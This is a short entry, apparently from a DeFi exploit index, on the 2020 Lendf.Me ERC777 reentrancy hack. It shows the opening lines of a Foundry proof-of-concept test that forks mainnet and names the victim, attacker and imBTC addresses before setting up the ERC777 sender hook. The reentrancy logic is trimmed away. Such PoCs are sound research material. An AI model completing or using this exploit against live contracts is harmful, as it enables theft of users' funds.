# [?] LendfMe - ERC777 Reentrancy

## Summary
Severity: Unknown
Chain: Ethereum
Component: LendfMe
Published: 2020-04-19
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2020-04/LendfMe_exp.sol
Type: defi-exploit-poc

## Details
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
Lendf.Me Reentry Exploit PoC

See https://peckshield.medium.com/uniswap-lendf-me-hacks-root-cause-and-loss-analysis-50f3263dcc09 for more detail

Example tx - https://etherscan.io/tx/0xae7d664bdfcc54220df4f18d339005c6faf6e62c9ca79c56387bc0389274363b
*/

interface IMoneyMarket {
    function supply(address asset, uint256 amount) external returns (uint256);

    function withdraw(address asset, uint256 requestedAmount) external returns (uint256);
}

contract LendfMeExploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address bancorAddress = 0x5f58058C0eC971492166763c8C22632B583F667f;
    address victim = 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea;
    address attacker = 0xA9BF70A420d364e923C74448D9D817d3F2A77822;
    IERC20 imBTC = IERC20(0x3212b29E33587A00FB1C83346f5dBFA69A458923);
    IERC1820Registry internal erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 internal constant TOKENS_SENDER_INTERFACE_HASH =
        0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;

    function setUp() public {
        cheats.createSelectFork("mainnet", 9_899_725);
    }

    function tokensToSend(
        address, // operator
        address, // from
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2020-04/LendfMe_exp.sol_
